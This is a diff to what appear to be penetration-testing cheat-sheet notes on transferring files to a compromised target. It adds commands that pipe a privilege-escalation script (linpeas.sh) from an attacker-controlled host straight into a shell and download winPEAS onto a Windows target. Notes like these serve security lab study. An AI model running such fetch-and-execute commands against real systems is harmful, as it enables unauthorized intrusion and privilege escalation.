@@ -40,7 +40,14 @@ sudo python3 -m pyftpdlib -p 21 -w
 wget http://$IP/file -O /tmp/file
 curl http://$IP/file -o /tmp/file
 ```
+example
+```bash
+# Linux target
+curl http://<your-vpn-ip>:80/linux/linpeas.sh | sh
 
+# Windows target (PowerShell)
+iwr -uri http://<your-vpn-ip>:80/windows/winPEASx64.exe -OutFile winpeas.exe
+```
 ### When no wget/curl
 ```bash
 # bash
